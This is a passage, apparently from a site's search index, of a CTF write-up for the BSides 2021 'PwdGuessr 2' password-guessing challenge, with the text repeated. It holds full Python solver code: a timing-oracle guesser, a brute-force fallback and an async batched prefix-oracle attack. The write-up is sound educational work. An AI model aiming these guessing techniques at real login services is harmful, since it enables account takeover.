new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return await self . guess_words_smart ( words , new_s ) async def solve ( self ): try : password = await self . guess_words_smart ( days ) password = await self . guess_words_smart ( movies , password ) password = await self . guess_words_smart ( elements , password ) await self . guess_words_smart ( nato_phonetic , password ) log . error ( \"Something after phonetic alphabet\" ) raise ValueError except SuccessfulConnection as e : log . debug ( f \"User: { self . user } \" ) log . debug ( f \"Password: { e . args [ 0 ] } \" ) self . loader . remove_guesser () return True , self . guesses , e . args [ 0 ], self . user And called it with async def main (): log . setLevel ( \"INFO\" ) r = remote ( HOST , PORT ) r . recvuntil ( \"remaining. \\n \" ) loader = Loader ( r ) for i in tqdm ( range ( 0 , 400 , CONCURRENCY )): if i == 200 : loader . total_guessers = 0 loader . incorrect_guesses = 0 log . debug ( r . recvuntil ( \"remaining. \\n \" , timeout = 0.5 ) . decode ()) r . sendline ( str ( CONCURRENCY )) users = r . recvline ( keepends = False ) . decode () . split ( \",\" ) log . debug ( r . recvline ( keepends = False ) . decode ()) guessers = [ GuesserAsync ( loader , user ) for user in users ] await asyncio . gather ( * [ guesser . solve () for guesser in guessers ]) avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) print ( r . recvall ( timeout = 2 )) This optimisation meant that it took ~1 min for 200 passwords, compared to 15 minutes. Optimisation - Benchmarking \u00b6 At this point, I needed a good way of testing the optimisations quickly to enable fast iteration on design. Thankfully the async rewrite had decoupled the network connectivity and the Guesser class which meant I could create a mock dataloader to serve previous passwords and benchmark the design quickly. I wrote an alternative dataloader and main which read the CSV acquired from the theorising step that looked like def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return \"_\" if p != s : return \"0\" return \"1\" class FakeLoader ( Loader ): def __init__ ( self , r : remote , user_data : Dict [ str , str ]): super () . __init__ ( r ) self . user_data = user_data def add_guesser ( self ): super ( FakeLoader , self ) . add_guesser () def resolve_batch ( self ): futures = self . futures self . futures = [] for user , password , future in futures : sample = self . user_data [ user ] resp = check_pwd ( sample , password ) log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) async def fake_main (): log . setLevel ( \"INFO\" ) with open ( \"results.csv\" ) as f : reader = csv . reader ( f ) passwords = [ row [ 2 ] for row in reader if row [ 0 ] == \"True\" ] user_data = { str ( uuid4 ()): password for password in passwords } loader = FakeLoader ( None , user_data ) for user , password in tqdm ( user_data . items ()): guesser = GuesserAsync ( loader , f \" { user } : { len ( password ) } \" ) await guesser . solve () avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) This meant that I could test against 200 passwords in less than a second Optimisation - Length Based Filtering \u00b6 Modifying the GuesserAsync to support optional max length was as simple as changing the __init__ def __init__ ( self , loader : Loader , user : str ): self . loader = loader if \":\" in user : self . user , max_len = user . split ( \":\" ) self . max_len = int ( max_len ) else : self . user = user self . max_len = None log . debug ( f \"Init: user= { user !r} \" ) self . guesses = 0 self . loader . add_guesser () I then made changes to guess_words_smart , to use the max_len to filter what words and letters were attempted, and in what order. To do this, I added an optional arg round that specified what round of words it was in, so different optimisations could be used for each wordlist. I made two optimisations which brought the average mistakes below 15. Nato Phonetic (Round 4) \u00b6 When guessing the Nato Phonetic alphabet, I filtered the words to only include words which would lead to a string of the target length This brought the avg mistakes from 26.3 => 16.3. Elements (Round 3) \u00b6 When checking elements, I changed the sorting of the first letters to count the combinations of element+nato_letter which had a password of target length. This brought the avg mistakes from 16.3 => 14.7 which was under the required count. Source \u00b6 This meant the guess_words_smart function looked like async def guess_words_smart ( self , words , password : str = \"\" , round = None ): # log.debug(f\"Partial: {self.password!r}\") # Napkin maths says 4 is a good number if len ( words ) < 3 : return await self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () # Length based optimizations if self . max_len is not None : current = len ( password ) delta = self . max_len - current if round == 3 : pass first_letters = Counter ( word [ 0 ] for word , next_word in product ( words , nato_phonetic ) if len ( word + next_word ) == delta ) . most_common () elif round == 4 : words = [ word for word in words if len ( word ) == delta ] if first_letters [ 0 ][ 1 ] == 1 : return await self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = await self . guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return await self . guess_words_smart ( new_words , password , round = round ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return await self . guess_words_smart ( words , new_s , round = round ) Success \u00b6 With these optimisations, I ran the script, the first time it ran out of guesses with one password remaining and at the nato alphabet round, so given how close it was, I just ran it again, which got me the flag. Source Code \u00b6 This used the same pwdguessrlists.py as PwdGuessr1 guesserv3.py import csv from itertools import zip_longest , product from typing import Dict from pwn import * from tqdm import tqdm import asyncio from uuid import uuid4 from collections import Counter from pwdguessrlists import ( elements , movies , days , nato_phonetic , ) # HOST = \"pwdguessr22222.chal.cybears.io\" HOST = \"127.0.0.1\" PORT = 2323 CONCURRENCY = 20 class SuccessfulConnection ( Exception ): pass class NotFound ( Exception ): pass class Timeout ( Exception ): pass class Loader : def __init__ ( self , r : remote ): self . r = r self . total_guessers = 0 self . incorrect_guesses = 0 self . guessers = 0 self . futures = [] def add_guesser ( self ): self . guessers += 1 self . total_guessers += 1 def remove_guesser ( self ): self . guessers -= 1 if len ( self . futures ) == self . guessers and self . guessers > 0 : self . resolve_batch () def submit ( self , user : str , password : str , future : asyncio . Future ): self . futures . append (( user , password , future )) if len ( self . futures ) == self . guessers : self . resolve_batch () def resolve_batch ( self ): futures = self . futures self . futures = [] self . r . recvline ( timeout = 0.1 ) query = \",\" . join ( f \" { user } : { password } \" for ( user , password , future ) in futures ) self . r . sendline ( query ) result = self . r . recvline () . decode () . strip () results = result . split ( \",\" ) log . debug ( f \"Results: { results !r} \" ) for resp , ( user , password , future ) in zip ( results , futures ): log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return \"_\" if p != s : return \"0\" return \"1\" class FakeLoader ( Loader ): def __init__ ( self , r : remote , user_data : Dict [ str , str ]): super () . __init__ ( r ) self . user_data = user_data def add_guesser ( self ): super ( FakeLoader , self ) . add_guesser () def resolve_batch ( self ): futures = self . futures self . futures = [] for user , password , future in futures : sample = self . user_data [ user ] resp = check_pwd ( sample , password ) log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) class GuesserAsync : def __init__ ( self , loader : Loader , user : str ): self . loader = loader if \":\" in user : self . user , max_len = user . split ( \":\" ) self . max_len = int ( max_len ) else : self . user = user self . max_len = None log . debug ( f \"Init: user= { user !r} \" ) self . guesses = 0 self . loader . add_guesser () async def check ( self , password ): log . debug ( f \"Check: { password } \" ) loop = asyncio . get_running_loop () future = loop . create_future () self . loader . submit ( self . user , password , future ) return await future async def guess_words ( self , words , password : str = \"\" ): for word in words : test = password + word if await self . check ( test ): return test else : return None async def guess_words_smart ( self , words , password : str = \"\" , round = None ): if len ( words ) < 3 : return await self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () # Silly optimizations if self . max_len is not None : current = len ( password ) delta = self . max_len - current if round == 3 : pass first_letters = Counter ( word [ 0 ] for word , next_word in product ( words , nato_phonetic ) if len ( word + next_word ) == delta ) . most_common () elif round == 4 : words = [ word for word in words if len ( word ) == delta ] if first_letters [ 0 ][ 1 ] == 1 : return await self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = await self . guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return await self . guess_words_smart ( new_words , password , round = round ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return await self . guess_words_smart ( words , new_s , round = round ) async def solve ( self ): try : password = await self . guess_words_smart ( days ) password = await self . guess_words_smart ( movies , password ) password = await self . guess_words_smart ( elements , password , round = 3 ) await self . guess_words_smart ( nato_phonetic , password , round = 4 ) log . error ( \"Something after phonetic alphabet\" ) raise ValueError except SuccessfulConnection as e : log . debug ( f \"User: { self . user } \" ) log . debug ( f \"Password: { e . args [ 0 ] } \" ) self . loader . remove_guesser () return True , self . guesses , e . args [ 0 ], self . user async def main (): log . setLevel ( \"INFO\" ) r = remote ( HOST , PORT ) r . recvuntil ( \"remaining. \\n \" ) loader = Loader ( r ) for i in tqdm ( range ( 0 , 400 , CONCURRENCY )): if i == 200 : loader . total_guessers = 0 loader . incorrect_guesses = 0 log . debug ( r . recvuntil ( \"remaining. \\n \" , timeout = 0.5 ) . decode ()) r . sendline ( str ( CONCURRENCY )) users = r . recvline ( keepends = False ) . decode () . split ( \",\" ) log . debug ( r . recvline ( keepends = False ) . decode ()) guessers = [ GuesserAsync ( loader , user ) for user in users ] await asyncio . gather ( * [ guesser . solve () for guesser in guessers ]) avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) print ( r . recvall ( timeout = 2 )) async def fake_main (): log . setLevel ( \"INFO\" ) with open ( \"results.csv\" ) as f : reader = csv . reader ( f ) passwords = [ row [ 2 ] for row in reader if row [ 0 ] == \"True\" ] user_data = { str ( uuid4 ()): password for password in passwords } loader = FakeLoader ( None , user_data ) for user , password in tqdm ( user_data . items ()): guesser = GuesserAsync ( loader , f \" { user } : { len ( password ) } \" ) await guesser . solve () avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) if __name__ == \"__main__\" : asyncio . run ( main ()) # asyncio.run(fake_main())","title":"PwdGuessr 2"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#pwdguessr-2","text":"","title":"PwdGuessr 2"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#an-interesting-password-guessing-challenge","text":"title: PwdGuessr 2 description: The significantly harder part of a password guessing challenge tags: - writeups - ctf - polished - python","title":"An interesting password guessing challenge"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#challenge-description","text":"To guess at things randomly is not to guess at all. Only through being methodical can enlightenment be achieved You round a bend in the road, and your party is set upon by bandits - an ambush! Fortunately, you've been praciticing your martial arts, and you take the opportunity to show off your latest moves. You kca-spank your way to a comprehensive victory, sending the bandits packing. As they run, one of them drops the device they use to coodinate their activities. If you can recover the credentials of enough bandits, you can make sure to avoid their attentions for the foreseeable future. nc $target_dns $target_port def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return False if p != s : time . sleep ( 0.5 ) # Add a delay to stop password-guessing attacks return False return True nc $target_dns $target_port","title":"Challenge Description"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#play-along-at-home","text":"During the CTF, the challenge was hosted at pwdguessr22222.chal.cybears.io:2323 To play after the CTF, run docker run --name pwdguessr2 -dp 2323 :2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr2 and then change the host in the scripts to 127.0.0.1","title":"Play Along at Home"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#walkthrough","text":"","title":"Walkthrough"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#recap","text":"Last challenge we discovered that the passwords were chosen by concatenating four pieces of information: A day of the week A movie from Harry Potter or the Nine Starwars Movies An element of the Periodic Table A nato phonetic alphabet letter This means there are 7 * 19 * 120 * 26 = 414960 possible passwords","title":"Recap"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#discovery","text":"This challenge was primarily an optimisation challenge, so largely was based off the original source with multiple refactors Connecting to the challenge with nc pwdguessr22222.chal.cybears.io 2323 gave the following banner: You need to prove your efficiency at password guessing. Send a single natural number to get that many IDs, each representing a password to guess. Send a comma separated list of ID:guess (up to 20 at a time) to get back a comma separated list of results. You still need to recover 200 passwords. You have 6000 incorrect guesses remaining. Which gives two useful bits of information If we wish to speed up out attempts, we can make up to 20 guesses at a time We need to guess 200 passwords with 6000 incorrect guesses, meaning we must average less than 30 incorrect guesses per user In the connection, sending a number gives user IDs which are UUIDs, which could then be used to guess For this challenge, rather than delaying the output for incorrect passwords, it returned either _ for partially correct, 1 for fully correct, and 0 for incorrect. This made it much faster.","title":"Discovery"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#theorising","text":"At first, I was uncertain whether there was a correlation between each segment of the password so I made a script to bulk solve challenge 1 and record the results in a CSV. To do this, I refactored my guesser into a class Guesser class Guesser : def __init__ ( self , host = HOST , port = PORT ): self . r = remote ( host , port ) self . host = host self . port = port user_line = self . r . recvline () . decode () self . user = user_line . split ( \" \" )[ - 1 ][: - 2 ] self . r . recvuntil ( \"Please enter your password: \" ) self . password = None self . guesses = 0 self . incorrect = 0 def check ( self , password ): log . debug ( f \"Checking: { password } \" ) self . guesses += 1 before = time . time () self . r . sendline ( password ) out = self . r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout self . password = password raise SuccessfulConnection ( out . decode ()) after = time . time () self . r . recvuntil ( \"Please enter your password: \" ) delta = after - before if delta < 0.5 : self . password = password return True self . incorrect += 1 return False def brute_force ( self , password : str = \"\" ): log . warning ( f \"Brute forcing from: { password } \" ) while True : for c in tqdm ( ALPHABET ): if self . check ( password + c ): password += c log . debug ( f \"Partial: { password } \" ) break else : raise NotFound ( \"Brute\" ) def guess_words ( self , words , password : str = \"\" , fallback = True ): for word in words : test = password + word if self . check ( test ): return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return self . brute_force ( password ) else : return None def guess_words_smart ( self , words , password : str = \"\" ): # Napkin maths says 4 is a good number if len ( words ) < 4 : return self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = self . guess_words ( first_letters_s , password , fallback = False ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return self . guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return self . guess_words_smart ( words , new_s ) def solve ( self ): try : password = self . guess_words_smart ( days ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( movies , password ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( elements , password ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( nato_phonetic , password ) log . info ( f \"Partial: { password !r} \" ) log . warning ( \"Something after phonetic alphabet, resorting to brute force\" ) self . brute_force ( password ) except SuccessfulConnection as e : log . info ( \"We're in!\" ) out = self . r . recvall ( 0.1 ) msg = e . args [ 0 ] + out . decode () log . info ( f \"Guesses: { self . guesses } \" ) log . info ( f \"User: { self . user } \" ) log . info ( f \"Password: { self . password } \" ) log . info ( f \"MSG: { msg } \" ) return True , self . guesses , self . password , self . user , self . incorrect except ( Timeout , EOFError , AssertionError ): return False , self . guesses , self . password , self . user , self . incorrect except Exception as e : log . exception ( e ) return False , self . guesses , self . password , self . user , self . incorrect finally : self . r . close () And wrote a bulk guesser script import multiprocessing from guesser import Guesser from pwn import * PARALLELISM = 50 SAMPLES = 200 def run_guess ( idx ): log . info ( f \"Starting { idx } \" ) try : guesser = Guesser () return guesser . solve () except : return None def main (): with multiprocessing . Pool ( PARALLELISM ) as p : results = p . map ( run_guess , range ( SAMPLES )) res_string = \" \\n \" . join ( \",\" . join ( str ( x ) for x in res ) for res in results if res is not None ) print ( res_string ) with open ( \"results.csv\" , \"a+\" ) as f : f . write ( res_string + \" \\n \" ) if __name__ == \"__main__\" : main () At this point, I discovered the various typos in my elements and nato alphabet (Removed a -) It appeared from looking at the data that was no correlation between the sections However this did also show that on average it was taking ~26.7 incorrected guesses per password which was within parameters.","title":"Theorising"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#solver","text":"I adapted the guesser to handle the user IDs which gave me, but just did one ID at a time from pwn import * from tqdm import tqdm from collections import Counter from pwdguessrlists import ( elements , movies , days , nato_phonetic , ) HOST = \"pwdguessr22222.chal.cybears.io\" PORT = 2323 ALPHABET = string . ascii_lowercase class SuccessfulConnection ( Exception ): pass class NotFound ( Exception ): pass class Timeout ( Exception ): pass class GuesserSecondary : def __init__ ( self , r ): self . r = r self . r . sendline ( \"1\" ) self . user = self . r . recvline () . decode () . strip () log . debug ( f \"user= { self . user !r} \" ) self . r . recvline () self . password = \"\" self . guesses = 0 def check ( self , password ): log . debug ( f \"Check: { password } \" ) self . guesses += 1 self . r . sendline ( f \" { self . user } : { password } \" ) out = self . r . recvline () . decode () self . r . recvline () if out [ 0 ] == \"0\" : return False if out [ 0 ] == \"_\" : self . password = password return True if out [ 0 ] == \"1\" : self . password = password raise SuccessfulConnection raise ValueError ( f \"Invalid Out: { out !r} \" ) def brute_force ( self , password : str = \"\" ): log . error ( f \"Brute forcing from: { password } \" ) while True : for c in tqdm ( ALPHABET ): if self . check ( password + c ): password += c log . debug ( f \"Partial: { password } \" ) break else : raise NotFound ( \"Brute\" ) def guess_words ( self , words , password : str = \"\" , fallback = True ): for word in words : test = password + word if self . check ( test ): return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return self . brute_force ( password ) else : return None def guess_words_smart ( self , words , password : str = \"\" ): # Napkin maths says 4 is a good number if len ( words ) < 4 : return self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = self . guess_words ( first_letters_s , password , fallback = False ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return self . guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return self . guess_words_smart ( words , new_s ) def solve ( self ): try : password = self . guess_words_smart ( days ) log . debug ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( movies , password ) log . debug ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( elements , password ) log . debug ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( nato_phonetic , password ) log . debug ( f \"Partial: { password !r} \" ) log . error ( \"Something after phonetic alphabet, resorting to brute force\" ) self . brute_force ( password ) except SuccessfulConnection : log . info ( \"We're in!\" ) out = self . r . recvuntil ( \"remaining. \\n \" , timeout = 1 ) log . info ( f \"MSG: { out } \" ) log . info ( f \"Guesses: { self . guesses } /6000 ( { round ( self . guesses / 60 , 2 ) } )\" ) log . info ( f \"User: { self . user } \" ) log . info ( f \"Password: { self . password } \" ) return True , self . guesses , self . password , self . user # except Timeout: # return False, self.guesses, self.password, self.user def main (): log . setLevel ( \"INFO\" ) r = remote ( HOST , PORT ) r . recvuntil ( \"remaining. \\n \" ) for i in tqdm ( range ( 201 )): guesser = GuesserSecondary ( r ) guesser . solve () if __name__ == \"__main__\" : main ()","title":"Solver"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#betrayal","text":"Running the script took 15 minutes, but after it reached 200, it didn't appear to exit like I'd expected. Conveniently I had been running Wireshark in the background so I saw what had occurred I'd received a \"flag\" of did_you_really_think_cybears{would_make_it_this_easy}? Followed by a banner like the original, but with an extra line at the end You need to prove even more efficiency at password guessing. Send a single natural number to get that many IDs, each representing a password to guess. Send a comma separated list of ID:guess (up to {} at a time) to get back a comma separated list of results. This time, you're given the length of each password alongside its ID. This meant that I had to repeat the 200 password part (which took 15) mins and then repeat, but this time using the known length of each password to reduce the incorrect attempts.","title":"Betrayal"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#optimisation-concurrency","text":"As waiting > 15 mins per attempt was impractical, (and I was still hopeful for first solve) I decided to bite the bullet and rewrite the guesser to guess 20 users at a time, with comma separated uid:password pairs.","title":"Optimisation - Concurrency"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#dataloader","text":"The approach I took for writing this is inspired by https://github.com/graphql/dataloader in that a dataloader receives requests, and batches the requests once a condition is reached. This was the first time I've ever really had to use Future's in Python, but as they are similar to Promise's in javascript, the learning curve was fine. class Loader : def __init__ ( self , r : remote ): self . r = r self . total_guessers = 0 self . incorrect_guesses = 0 self . guessers = 0 self . futures = [] def add_guesser ( self ): self . guessers += 1 self . total_guessers += 1 def remove_guesser ( self ): self . guessers -= 1 if len ( self . futures ) == self . guessers and self . guessers > 0 : self . resolve_batch () def submit ( self , user : str , password : str , future : asyncio . Future ): self . futures . append (( user , password , future )) if len ( self . futures ) == self . guessers : self . resolve_batch () def resolve_batch ( self ): futures = self . futures self . futures = [] self . r . recvline ( timeout = 0.1 ) query = \",\" . join ( f \" { user } : { password } \" for ( user , password , future ) in futures ) self . r . sendline ( query ) result = self . r . recvline () . decode () . strip () results = result . split ( \",\" ) log . debug ( f \"Results: { results !r} \" ) for resp , ( user , password , future ) in zip ( results , futures ): log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) This let me rewrite the check function to use promises, and added many async and awaits through the guesser class. class GuesserAsync : def __init__ ( self , loader : Loader , user : str ): self . loader = loader self . user = user log . debug ( f \"Init: user= { user !r} \" ) self . guesses = 0 self . loader . add_guesser () async def check ( self , password ): log . debug ( f \"Check: { password } \" ) loop = asyncio . get_running_loop () future = loop . create_future () self . loader . submit ( self . user , password , future ) return await future async def guess_words ( self , words , password : str = \"\" ): for word in words : test = password + word if await self . check ( test ): return test else : return None async def guess_words_smart ( self , words , password : str = \"\" ): # log.debug(f\"Partial: {self.password!r}\") # Napkin maths says 4 is a good number if len ( words ) < 3 : return await self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return await self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = await self . guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return await self . guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return await self . guess_words_smart ( words , new_s ) async def solve ( self ): try : password = await self . guess_words_smart ( days ) password = await self . guess_words_smart ( movies , password ) password = await self . guess_words_smart ( elements , password ) await self . guess_words_smart ( nato_phonetic , password ) log . error ( \"Something after phonetic alphabet\" ) raise ValueError except SuccessfulConnection as e : log . debug ( f \"User: { self . user } \" ) log . debug ( f \"Password: { e . args [ 0 ] } \" ) self . loader . remove_guesser () return True , self . guesses , e . args [ 0 ], self . user And called it with async def main (): log . setLevel ( \"INFO\" ) r = remote ( HOST , PORT ) r . recvuntil ( \"remaining. \\n \" ) loader = Loader ( r ) for i in tqdm ( range ( 0 , 400 , CONCURRENCY )): if i == 200 : loader . total_guessers = 0 loader . incorrect_guesses = 0 log . debug ( r . recvuntil ( \"remaining. \\n \" , timeout = 0.5 ) . decode ()) r . sendline ( str ( CONCURRENCY )) users = r . recvline ( keepends = False ) . decode () . split ( \",\" ) log . debug ( r . recvline ( keepends = False ) . decode ()) guessers = [ GuesserAsync ( loader , user ) for user in users ] await asyncio . gather ( * [ guesser . solve () for guesser in guessers ]) avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) print ( r . recvall ( timeout = 2 )) This optimisation meant that it took ~1 min for 200 passwords, compared to 15 minutes.","title":"Dataloader"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#optimisation-benchmarking","text":"At this point, I needed a good way of testing the optimisations quickly to enable fast iteration on design. Thankfully the async rewrite had decoupled the network connectivity and the Guesser class which meant I could create a mock dataloader to serve previous passwords and benchmark the design quickly. I wrote an alternative dataloader and main which read the CSV acquired from the theorising step that looked like def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return \"_\" if p != s : return \"0\" return \"1\" class FakeLoader ( Loader ): def __init__ ( self , r : remote , user_data : Dict [ str , str ]): super () . __init__ ( r ) self . user_data = user_data def add_guesser ( self ): super ( FakeLoader , self ) . add_guesser () def resolve_batch ( self ): futures = self . futures self . futures = [] for user , password , future in futures : sample = self . user_data [ user ] resp = check_pwd ( sample , password ) log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) async def fake_main (): log . setLevel ( \"INFO\" ) with open ( \"results.csv\" ) as f : reader = csv . reader ( f ) passwords = [ row [ 2 ] for row in reader if row [ 0 ] == \"True\" ] user_data = { str ( uuid4 ()): password for password in passwords } loader = FakeLoader ( None , user_data ) for user , password in tqdm ( user_data . items ()): guesser = GuesserAsync ( loader , f \" { user } : { len ( password ) } \" ) await guesser . solve () avg_mistakes = round ( loader . incorrect_guesses / loader . total_guessers , 2 ) log . info ( f \"Total Mistakes: { loader . incorrect_guesses } \" ) log . info ( f \"Avg Mistakes: { avg_mistakes } \" ) This meant that I could test against 200 passwords in less than a second","title":"Optimisation - Benchmarking"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#optimisation-length-based-filtering","text":"Modifying the GuesserAsync to support optional max length was as simple as changing the __init__ def __init__ ( self , loader : Loader , user : str ): self . loader = loader if \":\" in user : self . user , max_len = user . split ( \":\" ) self . max_len = int ( max_len ) else : self . user = user self . max_len = None log . debug ( f \"Init: user= { user !r} \" ) self . guesses = 0 self . loader . add_guesser () I then made changes to guess_words_smart , to use the max_len to filter what words and letters were attempted, and in what order. To do this, I added an optional arg round that specified what round of words it was in, so different optimisations could be used for each wordlist. I made two optimisations which brought the average mistakes below 15.","title":"Optimisation - Length Based Filtering"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#nato-phonetic-round-4","text":"When guessing the Nato Phonetic alphabet, I filtered the words to only include words which would lead to a string of the target length This brought the avg mistakes from 26.3 => 16.3.","title":"Nato Phonetic (Round 4)"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#elements-round-3","text":"When checking elements, I changed the sorting of the first letters to count the combinations of element+nato_letter which had a password of target length. This brought the avg mistakes from 16.3 => 14.7 which was under the required count.","title":"Elements (Round 3)"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#source","text":"This meant the guess_words_smart function looked like async def guess_words_smart ( self , words , password : str = \"\" , round = None ): # log.debug(f\"Partial: {self.password!r}\") # Napkin maths says 4 is a good number if len ( words ) < 3 : return await self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () # Length based optimizations if self . max_len is not None : current = len ( password ) delta = self . max_len - current if round == 3 : pass first_letters = Counter ( word [ 0 ] for word , next_word in product ( words , nato_phonetic ) if len ( word + next_word ) == delta ) . most_common () elif round == 4 : words = [ word for word in words if len ( word ) == delta ] if first_letters [ 0 ][ 1 ] == 1 : return await self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = await self . guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return await self . guess_words_smart ( new_words , password , round = round ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return await self . guess_words_smart ( words , new_s , round = round )","title":"Source"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#success","text":"With these optimisations, I ran the script, the first time it ran out of guesses with one password remaining and at the nato alphabet round, so given how close it was, I just ran it again, which got me the flag.","title":"Success"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/#source-code","text":"This used the same pwdguessrlists.py as PwdGuessr1 guesserv3.py import csv from itertools import zip_longest , product from typing import Dict from pwn import * from tqdm import tqdm import asyncio from uuid import uuid4 from collections import Counter from pwdguessrlists import ( elements , movies , days , nato_phonetic , ) # HOST = \"pwdguessr22222.chal.cybears.io\" HOST = \"127.0.0.1\" PORT = 2323 CONCURRENCY = 20 class SuccessfulConnection ( Exception ): pass class NotFound ( Exception ): pass class Timeout ( Exception ): pass class Loader : def __init__ ( self , r : remote ): self . r = r self . total_guessers = 0 self . incorrect_guesses = 0 self . guessers = 0 self . futures = [] def add_guesser ( self ): self . guessers += 1 self . total_guessers += 1 def remove_guesser ( self ): self . guessers -= 1 if len ( self . futures ) == self . guessers and self . guessers > 0 : self . resolve_batch () def submit ( self 